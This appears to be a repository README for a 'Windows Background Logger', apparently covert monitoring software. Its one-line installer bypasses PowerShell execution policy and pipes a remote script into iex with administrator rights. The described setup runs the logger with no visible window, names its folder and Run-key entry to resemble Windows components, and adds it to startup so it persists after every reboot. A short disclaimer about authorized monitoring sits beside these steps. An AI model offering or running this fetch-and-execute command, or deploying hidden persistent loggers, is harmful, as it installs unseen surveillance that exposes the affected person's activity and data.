# 🚀 Windows Automated Background Logger Setup

This repository provides a **fully automated** solution to install and run a Python-based Logger on any Windows computer with just **one PowerShell command**. No manual downloads required.

---

## ⚡ Quick One-Line Installation

Open **PowerShell as Administrator** and run the following command:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iwr -useb https://raw.githubusercontent.com/Pathum-Official/logger/refs/heads/main/setup.ps1 | iex
```
🛠️ What This Script Does Automatically

Checks if Python is installed
Installs Python 3.12.8 silently (if not found)
Downloads logger.py and requirements.txt
Installs all required Python packages with improved network handling
Runs the logger in the background using pythonw.exe (no visible console window)
Adds the logger to Windows Startup (runs automatically after every reboot)


📂 Installation Details
Installation Folder:
```text
C:\Users\<YourUsername>\AppData\Local\WindowsLogger\
```
Files Created:

logger.py
requirements.txt

Registry Key Added:

Path: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Name: WindowsBackgroundLogger


🔧 Manual Installation (Alternative)
If you prefer to run it manually:

Download setup.ps1 from this repository
Open PowerShell as Administrator
Navigate to the folder containing setup.ps1
Run:

```PowerShell
.\setup.ps1
```
🛑 Complete Uninstallation
To completely remove the Logger from your system, follow these steps:
1. Stop the Background Process
```PowerShell
Stop-Process -Name "pythonw" -Force -ErrorAction SilentlyContinue
```
2. Remove from Windows Startup
```PowerShell
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsBackgroundLogger" -ErrorAction SilentlyContinue
```
4. Delete All Files
```PowerShell
Remove-Item -Path "$env:LOCALAPPDATA\WindowsLogger" -Recurse -Force -ErrorAction SilentlyContinue
```
⚠️ Disclaimer
This tool is provided for educational purposes, system administration, and authorized testing only.

Use only on systems you own or have explicit permission to monitor.
The author is not responsible for any misuse of this software.


📌 Notes

The script now includes better error handling for network issues during package installation.
All output messages are in clear English.
Works on Windows 10 and Windows 11.


Made with ❤️ for easy and clean deployment.
